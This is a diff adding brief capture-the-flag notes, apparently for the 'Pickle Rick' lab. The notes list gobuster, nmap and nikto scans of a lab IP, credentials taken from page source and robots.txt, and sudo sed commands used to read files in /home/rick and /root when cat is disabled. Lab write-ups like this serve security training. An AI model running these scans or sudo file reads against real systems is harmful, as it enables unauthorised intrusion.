@@ -1,0 +1,15 @@
+picklerick.txt
+
+View Source see
+Username: R1ckRul3s
+
+robotx.txt has: Wubbalubbadubdub
+gobuster dir -u http://10.10.82.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
+nmap -sV -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.82.55
+nikto -host http://10.10.82.55
+login page found: /login.php
+from above: R1ckRul3s:Wubbalubbadubdub
+http://10.10.82.55/Sup3rS3cretPickl3Ingred.txt
+They disabled cat...
+sudo sed 1p /home/rick/second\ ingredients
+sudo sed 1p /root/3rd.txt
